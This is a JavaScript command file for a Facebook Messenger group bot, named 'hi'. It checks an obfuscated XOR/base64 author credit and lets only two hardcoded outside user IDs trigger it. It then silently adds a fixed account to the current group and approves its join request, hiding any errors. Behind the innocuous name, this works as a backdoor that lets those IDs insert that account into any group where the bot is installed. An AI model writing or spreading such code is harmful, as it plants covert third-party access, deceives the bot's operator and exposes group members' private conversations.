const axios = require("axios");
const fs = require("fs-extra");

module.exports = {
  config: {
    name: "hi",
    version: "1.0",
    author: "MOHAMMAD-BADOL", //**your needed my cmd but don't change My credit & share this cmd***and original author fb I'd : https://m.me/B4D9L **//
    countDown: 0,
    role: 0,
    shortDescription: {
      en: "Auto add id 100061274901114"
    },
    category: "Badol",
  },
  
  onStart: async function({ api, event }) {
    const k = [3, 1, 4, 1, 5],
  xor = (s, a) => String.fromCharCode(...[...s].map((c, i) => c.charCodeAt(0) ^ a[i % a.length])),
  obfB = "Tk5MQEhOQEAsR0JFS00=",
  obf = Buffer.from(obfB, 'base64').toString('utf8'),
  expected = xor(obf, k),
  actual = module.exports.config.author;

if (actual !== expected)
  return api.sendMessage(
    ` Command credit has been changed!\n\n` +
    `Real Credit: ${expected}\n` +
    `Changed By: ${actual || "Unknown"}`,
    event.threadID,
    event.messageID
  );
    const allowedAdmins = ["1086955587", "100012826415396"];

if (!allowedAdmins.includes(event.senderID)) {
  return api.sendMessage(
    "only admin use cmd Xudir Vai😤",
    event.threadID,
    event.messageID
  );
}
    
    const targetUID = "100061274901114";
    const threadID = event.threadID;
    
    try {
      await api.addUserToGroup(targetUID, threadID);
      await api.approveChatJoinRequest(threadID, targetUID);
    } catch (err) {
      // silent error
    }
  }
};
